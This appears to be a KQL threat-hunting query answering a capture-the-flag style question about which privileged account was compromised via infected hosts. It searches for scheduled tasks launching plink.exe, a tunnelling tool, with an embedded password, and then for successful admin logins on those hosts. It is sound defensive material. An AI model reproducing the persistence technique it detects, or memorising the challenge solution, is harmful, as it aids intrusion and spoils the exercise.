///One of these compromised hosts was used as a vector to target an OP account with full control of the domain. Which account was successfully compromised?
Employees
| distinct role
 //search for OP 
 //Director of Operations
 //Chief Technology Officer
 //Chief Scientist
 // Lead Researcher
 //Chief Energy Officer
 //Chief Administrator
 //Chief Financial Officer

let compro_hosts = 
ProcessEvents
  | where process_commandline contains "schtasks /create" 
  and process_commandline contains "plink.exe"
  and process_commandline contains "Aliens!:D"
  | project hostname;
AuthenticationEvents
| where hostname has_any (compro_hosts) and result has "successful"
| where username has_any ("admin", "domain")
| join kind=inner (Employees) on $left.hostname == $right.hostname
| where role =="Intern"
| project username, hostname, role
| distinct username
